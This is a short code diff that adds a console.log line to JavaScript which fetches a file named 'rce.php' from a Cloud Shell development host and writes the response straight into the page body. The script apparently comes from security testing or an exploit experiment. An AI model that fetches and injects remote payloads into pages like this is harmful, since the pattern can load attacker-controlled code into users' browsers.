@@ -1,5 +1,5 @@
 fetch("https://8080-cs-8ea4b567-821e-470a-baa0-84c7db793d86.cs-asia-southeast1-bool.cloudshell.dev/rce.php").then(res=>res.text()).then(res => {
-
+console.log(res)
 
   document.body.innerHTML = res;
 
